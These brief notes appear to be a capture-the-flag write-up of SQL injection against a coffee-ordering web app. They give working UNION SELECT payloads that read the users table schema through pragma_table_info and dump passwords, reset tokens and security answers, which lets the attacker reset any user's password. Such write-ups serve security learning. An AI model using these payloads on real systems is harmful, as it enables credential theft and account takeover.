- sql injection on the coffee selection
- table users holds all users, but need to know which column holds the "favorite animal" data, can't guess this

```
1 UNION SELECT cid, type, name FROM pragma_table_info('users')
```
returns the columns in the table users -> found out that favorite animal is in column "security"

then
```
1 UNION SELECT password, username, reset_token FROM users
```
leaks the reset token of all users and

```
1 UNION SELECT password, username, security FROM users
```

leaks the favorite animal of all users, can reset password now